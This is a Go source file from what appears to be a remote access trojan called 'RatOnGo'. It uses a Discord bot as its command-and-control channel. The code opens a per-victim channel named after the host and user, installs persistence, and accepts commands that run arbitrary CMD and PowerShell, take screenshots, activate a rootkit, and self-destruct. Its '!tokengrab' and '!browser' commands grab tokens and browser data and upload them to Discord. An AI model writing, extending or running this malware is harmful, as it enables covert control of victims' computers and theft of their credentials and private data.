package discord

import (
	"RatOnGo/handlers"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var (
	session          *discordgo.Session
	sessionChannelID string
)

func StartBot(token, guildID string) {
	var err error
	session, err = discordgo.New("Bot " + token)
	if err != nil {
		return
	}

	session.AddHandlerOnce(func(s *discordgo.Session, r *discordgo.Ready) {
		setupSessionChannel(guildID)
		s.AddHandler(messageCreate)
		persistenceResult := handlers.EnsurePersistence()
		Log(persistenceResult)
	})

	session.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuilds

	err = session.Open()
	if err != nil {
		return
	}

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	session.Close()
}

func setupSessionChannel(guildID string) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	channelName := fmt.Sprintf("session-%s-%s", strings.ToLower(hostname), strings.ToLower(username))

	ch, err := session.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
	if err != nil {
		session.Close()
		return
	}
	sessionChannelID = ch.ID

	welcomeMsg := fmt.Sprintf("✅ **New session started**\n\n> **Host:** `%s`\n> **User:** `%s`\n\n*Waiting for commands... (!cmd, !shell, !screen, !persistence, !tokengrab, !browser, !exit)*", hostname, username)
	Log(welcomeMsg)
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID || m.ChannelID != sessionChannelID {
		return
	}

	parts := strings.Fields(m.Content)
	if len(parts) == 0 {
		return
	}

	command := parts[0]
	args := strings.Join(parts[1:], " ")
	var response string

	switch command {
	case "!cmd":
		response = handlers.ExecuteCMD(args)
		sendResponse(response)
	case "!shell":
		response = handlers.ExecutePowerShell(args)
		sendResponse(response)
	case "!persistence":
		response = handlers.EnsurePersistence()
		sendResponse(response)
	case "!rootkit":
		response = handlers.ActivateRootkit()
		sendResponse(response)
	case "!screen":
		filePath, err := handlers.TakeScreenshot()
		if err != nil {
			sendResponse(err.Error())
			return
		}
		file, err := os.Open(filePath)
		if err != nil {
			sendResponse(fmt.Sprintf("❌ Error opening screenshot file: %v", err))
			return
		}
		defer file.Close()

		s.ChannelMessageSendComplex(sessionChannelID, &discordgo.MessageSend{
			Content: "📸 **Screenshot:**",
			Files: []*discordgo.File{
				{
					Name:        "screenshot.png",
					ContentType: "image/png",
					Reader:      file,
				},
			},
		})

		os.Remove(filePath)

	case "!tokengrab":
		sendResponse("👀 Searching for tokens... This may take a few seconds.")
		response = handlers.GrabTokens()
		sendResponse(response)
	case "!browser":
		sendResponse("🌐 Collecting browser data... This may take a moment.")
		filePath, summary := handlers.StealBrowserData()
		if filePath != "" {
			file, err := os.Open(filePath)
			if err != nil {
				sendResponse(fmt.Sprintf("❌ Error opening ZIP file: %v", err))
				return
			}
			defer file.Close()
			defer os.Remove(filePath)

			s.ChannelMessageSendComplex(sessionChannelID, &discordgo.MessageSend{
				Content: summary,
				Files: []*discordgo.File{
					{
						Name:        filepath.Base(filePath),
						ContentType: "application/zip",
						Reader:      file,
					},
				},
			})
		} else {
			sendResponse(summary)
		}
	case "!exit":
		response = handlers.SelfDestruct()
		sendResponse(response)
		time.Sleep(3 * time.Second)
		os.Exit(0)
	default:
		return
	}
}

func Log(message string) {
	if session == nil || sessionChannelID == "" {
		return
	}
	sendResponse(message)
}

func sendResponse(content string) {
	if content == "" {
		content = "Command executed with no output."
	}
	formattedContent := "```\n" + content + "\n```"

	limit := 2000
	if len(formattedContent) <= limit {
		session.ChannelMessageSend(sessionChannelID, formattedContent)
		return
	}

	for i := 0; i < len(content); i += (limit - 10) {
		end := i + (limit - 10)
		if end > len(content) {
			end = len(content)
		}
		session.ChannelMessageSend(sessionChannelID, "```\n"+content[i:end]+"\n```")
		time.Sleep(500 * time.Millisecond)
	}
}